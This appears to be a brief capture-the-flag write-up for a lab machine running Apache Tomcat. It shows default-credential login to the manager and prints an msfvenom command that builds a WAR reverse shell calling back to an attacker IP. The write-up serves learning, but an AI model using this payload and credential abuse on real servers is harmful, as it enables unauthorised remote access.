 Summary
- Takeaways:
	- `dir` and `type` are the equivalents of `ls` and `cat` when in a `cmd.exe` shell without any `powershell` functionality
- User: able to log in to Tomcat with default credentials and upload a malicious WAR to get RCE
- Root: see above

# Details
### User
- scan reveals only port 8080 is open and is hosting an `Apache Tomcat` instance
- doesn't seem to be an obvious vulnerability, but it's possible to login to the "Tomcat Web Application Manager" with default credentials `tomcat:s3cre3t`
- once you have access to the application manager, you can construct and upload a malicious WAR file that executes a reverse shell as `root`
	- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.114 LPORT=443 -f war -o rshell.war`
- https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat

### Root
- see above
